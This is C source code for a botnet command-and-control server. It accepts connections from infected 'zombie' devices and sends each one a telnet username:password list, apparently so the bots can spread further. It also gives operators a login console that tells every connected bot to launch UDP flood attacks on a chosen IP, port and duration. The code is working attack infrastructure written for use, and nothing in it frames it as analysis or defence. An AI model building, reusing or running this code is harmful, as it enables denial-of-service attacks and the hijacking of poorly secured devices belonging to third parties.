// cnc written by hubnr :)
// epoll worker stolen and modified from qBot
// left off on plans, rewrite the login to read a certain plan read from a char or something...

#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <ctype.h>
#include <stdarg.h>
#include <arpa/inet.h>

#include "headers.h"
#include "auth.h"
#include "commands.h"

static BotInfo bots[MAXFDS];
static Command cmd_list[100];
static int command_count = 0;

int Bot_fd, C2_fd, epoll_fd;
int admin_port = 1337;
int bot_port = 16;
int threads = 100;

BotInfo *retrieve_all_bots(int *numptrs)
{
    *numptrs = MAXFDS;
    return bots;
}

static void ddos_method_addCommand(char *commandName, unsigned char id) 
{
    strcpy(cmd_list[command_count].commandName, commandName);
    cmd_list[command_count].id = id;
    command_count++;
}

static int ddos_method_checkCommandExists(char *commandName) 
{
    for (int i = 0; i < command_count; i++) 
    {
        if (strcmp(cmd_list[i].commandName, commandName) == 0) 
        {
            return 1;
        }
    }
    return 0;
}

static unsigned char ddos_method_getIdFromCommandName(char *commandName) 
{
    for (int i = 0; i < command_count; i++) 
    {
        if (strcmp(cmd_list[i].commandName, commandName) == 0) 
        {
            return cmd_list[i].id;
        }
    }
    return 0;
}

void util_trim(char *str) 
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin]))
        begin++;
    while ((end >= begin) && isspace(str[end]))
        end--;
    for (i = begin; i <= end; i++)
        str[i - begin] = str[i];
    str[i - begin] = '\0';
}

void util_sockprintf(const int fd, const char *format, ...) 
{
    char buffer[1024];
    va_list args;
    va_start(args, format);
    int len = vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);

    write(fd, buffer, len);
}

int util_read(int fd, unsigned char *buffer, uint16_t bufferSize) 
{
    memset(buffer, 0, bufferSize);
    int total = 0, got = 1;
    while (got == 1 && total < bufferSize) {
        got = read(fd, buffer + total, 1);
        total++;
        if(*(buffer + total - 1) == '\n')
        {
            break;
        }
    }

    util_trim(buffer);
    int j;
    for (j = 0; j < sizeof(buffer); j++) 
    {
        if (buffer[j] == '\r' || buffer[j] == '\n') 
        {
            buffer[j] = 0;
        }
    }
    return got;
}

void util_cpy(void *ptr, void *src, size_t len)
{
    if (ptr != NULL && src != NULL && len > 0)
    {
        uint8_t *ptr_bytes = (uint8_t *)ptr;
        uint8_t *src_bytes = (uint8_t *)src;
        int x;
        for (x = 0; x < len; x++)
        {
            ptr_bytes[x] = src_bytes[x];
        }
    }
    return;
}

uint8_t **util_tokenize(const unsigned char *buf, int *count, const char delim) 
{
    uint8_t **ret = {NULL};
    int ret_count = 0, token_pos = 0, pos;
    char token[512];
    memset(token, 0, 512);
    for (pos = 0; pos < strlen(buf); pos++) 
    {
        if (buf[pos] == delim) 
        {
            ret = realloc(ret, (ret_count + 1) * sizeof(uint8_t *));
            ret[ret_count] = malloc(token_pos + 1);
            char *value = ret[ret_count];
            memset(value, 0, token_pos + 1);

            token[token_pos] = 0;

            strcpy(value, token);

            ret_count++;

            memset(token, 0, 512);
            token_pos = 0;
        } 
        else 
        {
            token[token_pos] = buf[pos];
            token_pos++;
        }
    }

    if (token_pos > 0) 
    {
        ret = realloc(ret, (ret_count + 1) * sizeof(uint8_t *));
        ret[ret_count] = strdup(token);
        ret_count++;
        memset(token, 0, 512);
        token_pos = 0;
    }

    *count = ret_count;
    return ret;
}

static void broadcastDetails(int maxbots, unsigned char *command, size_t command_len)
{
    unsigned int g = 0, count = 0;
    for (g = 0; g < maxbots; g++)
    {
        if (bots[g].connected == 1)
        {
            send(g, command, command_len, MSG_NOSIGNAL);
            count++;
        }
    }
}

unsigned int printBots() 
{
    unsigned int total = 0;
    unsigned int g;
    for (g = 0; g < MAXFDS; g++) 
    {
        if (bots[g].connected == 1) 
        {
            total++;
        }
    }
    return total;
}

uint8_t start_rep(int fd)  // sends message to all bots, notifies the management clients of this happening
{
    uint8_t ret = 0;

    FILE *resp_fp = NULL;

    //bot reads user:pass\r\n file combolist
    resp_fp = fopen("./telnet_credentials.txt", "r");
    
    if(resp_fp == NULL)
    {
        printf("No file './telnet_credentials.txt'! make 'user:pass' combo for each line\r\n");
        ret = 0;
        return ret;
    }
    
    uint16_t resp_buffer_len = 2;
    uint8_t *resp_buffer = malloc(resp_buffer_len);
    uint8_t *resp_tmp_buffer = malloc(4096);
    uint16_t resp_tmp_buffer_len = 0;
    
    resp_buffer[0] = 0x33; // 0xff
    resp_buffer[1] = 0x01; // 0xff
    
    memset(resp_tmp_buffer, 0, 4096);
    
    while(fgets(resp_tmp_buffer, 4096, resp_fp) != NULL)
    {
        int i;
        
        for(i = 0; i < 4096; i++)
        {
            if(resp_tmp_buffer[i] == '\r' || resp_tmp_buffer[i] == '\n')
            {
                resp_tmp_buffer[i] = 0;
                continue;
            }
            continue;
        }
        
        resp_tmp_buffer_len = strlen(resp_tmp_buffer);
        resp_buffer = realloc(resp_buffer, (resp_buffer_len+resp_tmp_buffer_len+1));
        for(i = resp_buffer_len; i < resp_buffer_len+resp_tmp_buffer_len; i++)
        {
            resp_buffer[i] = resp_tmp_buffer[i-resp_buffer_len];
        }
        resp_buffer_len += resp_tmp_buffer_len;
        
        resp_buffer[resp_buffer_len] = 0xff;
        resp_buffer_len++;

        memset(resp_tmp_buffer, 0, 4096);
        resp_tmp_buffer_len = 0;
        continue;
    }
    
    fclose(resp_fp);
    resp_fp = NULL;
    
    memset(resp_tmp_buffer, 0, 4096);
    resp_tmp_buffer_len = 0;
    free(resp_tmp_buffer);
    resp_tmp_buffer = NULL;

    if(resp_buffer_len == 2 || resp_buffer_len <= 0 || resp_buffer == NULL)
    {
        if(resp_buffer != NULL)
        {
            int i;
            for(i = 0; i < resp_buffer_len; i++)
            {
                resp_buffer[i] = 0;
            }
            free(resp_buffer);
            resp_buffer = NULL;
        }     
        ret = 0;
        return ret;
    }

    send(fd, resp_buffer, resp_buffer_len, MSG_NOSIGNAL);

    if(resp_buffer != NULL)
    {
        int i;
        for(i = 0; i < resp_buffer_len; i++)
        {
            resp_buffer[i] = 0;
        }
        free(resp_buffer);
        resp_buffer = NULL;
    } 
    
    ret = 1;
    return ret;
}

bool isBlacklisted(const char *target) 
{
    char line[512];
    FILE *f = fopen("blacklist.txt", "r");
    if (f == NULL) {
        f = fopen("blacklist.txt", "w");
        if (f == NULL) {
            printf("BLACKLIST ERROR: Unable to open file for writing.\n");
            return false;
        }
        fprintf(f, "127.0.0.1\n");
        fflush(f);
        fclose(f);
        if (strcmp(target, "127.0.0.1") == 0) 
        {
            return true;
        }
        return false;
    }

    while (fgets(line, sizeof(line), f) != NULL)
    {
        line[strcspn(line, "\r\n")] = '\0'; // Remove newline characters
        if (strcmp(line, target) == 0) 
        {
            fclose(f);
            return true;
        }
    }
    fclose(f);
    return false;
}

void *titleThread(void *ffd) 
{
    char title[1024];
    char str[512];
    int fd = *(int *)ffd;
    while (TRUE) 
    {
        memset(title, 0, sizeof(title));
        memset(str, 0, sizeof(str));
        sprintf(str, "Loaded: %d", printBots());
        strcat(title, "\033]0;");
        strcat(title, str);
        strcat(title, "\007");
        send(fd, title, strlen(title), MSG_NOSIGNAL);
        sleep(3);
    }
}

void *userThread(void *arg) 
{
    pthread_t threads[2];
    char buffer[512];
    AdminArgs *args = (AdminArgs *)arg;
    int fd = args->fd;
    char message[512];

    Credentials credentials;

    UserInfo user;

    memset(buffer, 0, 512);
    memset(message, 0, 512);

    util_sockprintf(fd, "Godbotネットワークへようこそ\r\n\033[1;31mユーザー名\033[1;33m: \033[0m");
    util_read(fd, buffer, sizeof(buffer));
    if(strlen(buffer) < 1)
    {
        close(fd);
        pthread_exit(0);
        return NULL;
    }
    strcpy(credentials.username, buffer);

    util_sockprintf(fd, "\033[1;31mパスワード\033[1;33m: \033[0m");
    util_read(fd, buffer, sizeof(buffer));
    if(strlen(buffer) < 1)
    {
        close(fd);
        pthread_exit(0);
        return NULL;
    }
    strcpy(credentials.password, buffer);

    if (validateLogin(&credentials, &user)) 
    {
        pthread_create(&threads[0], NULL, titleThread, (void *)&fd);
        send(fd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL);
        sprintf(message, "%s@microwave: ", user.username);
        send(fd, message, strlen(message), MSG_NOSIGNAL);

        while (util_read(fd, buffer, sizeof(buffer)) > 0) 
        {
            if(strlen(buffer) < 1)
            {
                memset(buffer, 0, sizeof(buffer));
                sprintf(message, "%s@microwave: ", user.username);
                send(fd, message, strlen(message), MSG_NOSIGNAL);
                continue;
            }

            int count = 0; // split up auth
            uint8_t **arguments = util_tokenize(buffer, &count, ' ');

            if(!strcmp(arguments[0], "?")) 
            {
                // Handle '?' case
            } 
            else if(commandHandler(args, arguments, count) == 1)
            {
                // do something after we use l33t's command handler
            }
            else if (ddos_method_checkCommandExists(arguments[0]))
            {
                if (count >= 4)
                {
                    unsigned char *target = arguments[1];
                    int dport = atoi(arguments[2]), duration = atoi(arguments[3]);

                    if (isBlacklisted(target))
                    {
                        util_sockprintf(fd, "%s is a blacklisted host\r\n", target);
                    }
                    else
                    {
                        unsigned char target_method = ddos_method_getIdFromCommandName(arguments[0]);
                        uint32_t target_ip_address = inet_addr(target);
                        uint16_t target_ip_port = htons(dport);
                        uint32_t target_duration = htonl(duration);

                        unsigned char command[64];
                        memset(command, 0, 64);
                        util_cpy(command, "\x00", 1);               // tell bot its a ddos attack
                        util_cpy(command+1, &target_method, 1);             // tell bot udpgame flood aka flood 0 in enum list located in bot/attacks.h
                        util_cpy(command+2, &target_ip_address, 4);
                        util_cpy(command+2+4, &target_ip_port, 2);
                        util_cpy(command+2+4+2, &target_duration, 4);
                        size_t cmd_len = 2+4+2+4;
                        util_sockprintf(fd, "\x1b[1;32m[%ds] commanding %d zombies to flood --> %s %s:%d\x1b[0m\r\n", duration, printBots(), arguments[0], target, dport);
                        broadcastDetails(MAXFDS, command, cmd_len);
                    }
                }
                else
                {
                    util_sockprintf(fd, "[INFO] enter <method> <target> <dport> <duration>\r\n");
                }
            }
            else 
            {
                util_sockprintf(fd, "Unknown command.\r\n");
            }

            memset(buffer, 0, sizeof(buffer));
            sprintf(message, "%s@microwave: ", user.username);
            send(fd, message, strlen(message), MSG_NOSIGNAL);

            int k;
            for (k = 0; k < count; k++) 
            {
                free(arguments[k]);
            }
            free(arguments);
        }
    }

    close(fd);
    pthread_detach(pthread_self());
    return NULL;
}

void reuseAddr(int fd)
{
    int s = 1;
    int check = setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &s, sizeof(s));
    if (check < 0)
    {
        printf("Unable to re-use same addr \n");
        exit(1);
    }
    else
    {
        printf("We can re-use the same addr \n");
    }
}

static void botConnection()
{
    struct sockaddr_in fd;
	socklen_t socklen = sizeof(fd);
	fcntl(Bot_fd, F_SETFL, fcntl(Bot_fd, F_GETFL, 0) | O_NONBLOCK);
	Bot_fd = socket(AF_INET, SOCK_STREAM, 0);
    fd.sin_family = AF_INET;
    fd.sin_addr.s_addr = INADDR_ANY;
	fd.sin_port = htons(bot_port);
	reuseAddr(Bot_fd);
	if(bind(Bot_fd, (struct sockaddr *)&fd, sizeof(fd)) < 0)
	{
		printf("Unable to bind to socket \n");
		exit(1);
	}
	if((listen(Bot_fd, SOMAXCONN)) < 0)
	{
		printf("Failed to listen \n");
		exit(1);
	}
	printf("Bot Socket started \n");
    return;
}

void *adminConnection()
{
    int s = 1;
    struct sockaddr_in C2;
    AdminArgs user;
    pthread_t thread;
    socklen_t C2len = sizeof(C2);
    C2_fd = socket(AF_INET, SOCK_STREAM, 0);
    C2.sin_family = AF_INET;
    C2.sin_addr.s_addr = INADDR_ANY;
    C2.sin_port = htons(admin_port);
    reuseAddr(C2_fd);
    if (bind(C2_fd, (struct sockaddr *)&C2, sizeof(C2)) < 0)
    {
        printf("Unable to bind to socket \n");
        exit(1);
    }
    if ((listen(C2_fd, 1)) < 0)
    {
        printf("Failed to listen \n");
        exit(1);
    }
    printf("C2 Socket started \n");
    while (1)
    {
        int user_fd = accept(C2_fd, (struct sockaddr *)&C2, &C2len);
        if (user_fd < 0)
        {
            printf("Unable to accept pending connection \n");
        }
        user.fd = user_fd;
        user.ip = C2.sin_addr.s_addr;
        pthread_create(&thread, NULL, &userThread, (void *)&user);
    }
    return NULL;
}

static void fdRemove(int thefd)
{
	int fd;
	fd = epoll_ctl(epoll_fd, EPOLL_CTL_DEL, bots[thefd].fd, NULL); // removes fd which qbot never done properly
	if(fd == -1)
	{
//		printf("Unable to remove file descriptor! \n");
	}
	else
	{
//		printf("Removed file descriptor! \n");
	}
	if(bots[thefd].fd != -1)
	{
		close(bots[thefd].fd);
	}
//	printf("Connection finished from bot socket. handled & now removed with epoll \n");
	bots[thefd].fd = -1;
	bots[thefd].ip = 0;
	bots[thefd].connected = 0;
	close(thefd);
}

void *epollWorker() 
{
    struct epoll_event event;
    struct epoll_event *events;
    int s;
    events = calloc(MAXFDS, sizeof event);

    while (1) 
    {
        int n, i;
        n = epoll_wait(epoll_fd, events, MAXFDS, -1);

        for (i = 0; i < n; i++) {
            if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) 
            {
                bots[events[i].data.fd].connected = 0;
                close(events[i].data.fd);
                continue;
            }
            else if (Bot_fd == events[i].data.fd) 
            {
                while (1) 
                {
                    struct sockaddr in_addr;
                    socklen_t in_len;
                    int infd, ipIndex;
                    in_len = sizeof(in_addr);
                    memset(&in_addr, 0, in_len);
                    infd = accept(Bot_fd, &in_addr, &in_len);

                    if (infd == -1) {
                        if ((errno == EAGAIN) || (errno == EWOULDBLOCK))
                            break;
                        else {
                            perror("accept");
                            break;
                        }
                    }

                    bots[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;

                    #ifdef DEBUG
                    printf("Incoming connection from %s \n", inet_ntoa(((struct sockaddr_in *)&in_addr)->sin_addr));
                    #endif

                    int dup = 0;
                    if(bots[infd].ip != 0x00)
                    {
                        for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++) 
                        {
                            if (!bots[ipIndex].connected || ipIndex == infd)
                                continue;

                            if (bots[ipIndex].ip == bots[infd].ip) {
                                dup = 1;
                                break;
                            }
                        }
                    }
                    else
                    {
                        dup = 0;
                    }

                    if (dup) 
                    {
                        close(infd);
                        continue;
                    }

                    fcntl(infd, F_SETFL, fcntl(infd, F_GETFL, 0) | O_NONBLOCK);
                    event.data.fd = infd;
                    event.events = EPOLLIN | EPOLLET;
                    s = epoll_ctl(epoll_fd, EPOLL_CTL_ADD, infd, &event);

                    if (s == -1) 
                    {
                        perror("epoll_ctl");
                        close(infd);
                        break;
                    }

                    bots[infd].fd = infd;
                    bots[infd].connected = 1;
                }
                continue;
            }
            else 
            {
                int thefd = events[i].data.fd;
                BotInfo *client = &(bots[thefd]);
                int done = 0;
                client->connected = 1;

                while (1) 
                {
                    ssize_t count;
                    unsigned char buf[2048];
                    memset(buf, 0, sizeof buf);

                    while (memset(buf, 0, sizeof buf) && (count = recv(thefd, buf, sizeof(buf) - 1, MSG_NOSIGNAL)) > 0) 
                    {
                        if(buf[0] == '\x55')
                        {
                            int name_len = count-1;
                            unsigned char name[32];
                            memset(name, 0, sizeof(name));
                            if(name_len >= 32)
                            {
                                name_len = 31;
                            }
                            strncpy(name, buf+1, name_len);
                            strncpy(client->tag, name, sizeof(client->tag));
                            printf("Client %s connected ~> %d.%d.%d.%d\r\n", client->tag, client->ip & 0xff, (client->ip >> 8) & 0xff, (client->ip >> 16) & 0xff, (client->ip >> 24) & 0xff);
                            start_rep(thefd);
                            continue;
                        }
                        util_trim(buf);
                        if (strcmp(buf, "PING") == 0) 
                        { // Basic IRC-like ping/pong challenge/response to see if server is alive
                            if (send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) 
                            {
                                done = 1; // Response
                                break;
                            }
                            continue;
                        }
                        if (strcmp(buf, "PONG") == 0) 
                        {
                            continue;
                        }
                    }

                    if (count == -1) 
                    {
                        if (errno != EAGAIN) 
                        {
                            done = 1;
                        }
                        break;
                    }
                    else if (count == 0) 
                    {
                        done = 1;
                        break;
                    }
                }

                if (done) 
                {
                    memset(client, 0, sizeof(BotInfo));
                    client->connected = 0;
                    fdRemove(thefd);
                }
            }
        }
    }
}

void epollSetup(void)
{
    int fd;
    struct epoll_event event;

    epoll_fd = epoll_create1(0);
    if (epoll_fd == -1)
    {
        printf("Unable to create epoll! \n");
        exit(1);
    }
    else
    {
        printf("Epoll created! \n");
    }

    event.data.fd = Bot_fd;
    event.events = EPOLLIN | EPOLLET;

    fd = epoll_ctl(epoll_fd, EPOLL_CTL_ADD, Bot_fd, &event);
    if (fd == -1)
    {
        printf("Unable to add the bot fd to epoll! \n");
        exit(1);
    }
    else
    {
        printf("Added bot fd to epoll worker!\n");
    }
}

void sendPing(void)
{
    int g;
    for (g = 0; g < MAXFDS; g++)
    {
        if (bots[g].connected == 1)
        {
            send(bots[g].fd, "PING", 4, MSG_NOSIGNAL);
        }
    }
}

int main(int argc, char *argv[])
{
    ddos_method_addCommand("udpflood", 0x01);
    /*ddos_method_addCommand("synflood", 0x02);
    ddos_method_addCommand("tcpflood", 0x03);*/

    command_init();

    pthread_t connection_threads;
    pthread_create(&connection_threads, NULL, adminConnection, NULL);
    printf("Threading started on C2 socket \n");

    botConnection();

    epollSetup();

    pthread_t bot_threads[threads];
    while (threads--)
    {
        pthread_create(&bot_threads[threads], NULL, &epollWorker, NULL);
    }

    while (TRUE)
    {
        sendPing();
        sleep(60);
    }
}
